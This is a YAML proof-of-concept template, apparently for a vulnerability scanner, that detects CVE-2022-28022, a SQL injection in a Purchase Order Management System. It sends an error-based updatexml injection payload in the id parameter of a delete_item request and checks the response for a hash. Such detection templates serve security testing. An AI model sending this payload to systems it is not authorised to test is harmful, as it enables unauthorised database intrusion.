name: yaml-poc-purchase_order_management_system_project-purchase_order_management_system-sql_injection-CVE-2022-28022
binding: 1dadc799-4e90-486a-a3d3-5ff3a6ce09b8
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-28022/
        - https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/purchase-order-management-system/SQLi-1.md
    vulnerability:
        id: c7f1347d-258e-4ad4-a3fc-c0dc1f958f77
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(10000000, 99999999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /classes/Master.php?f=delete_item
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: id=1' and updatexml(1,concat(0x7e,(select md5({{s1}})),0x7e),0)--+
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
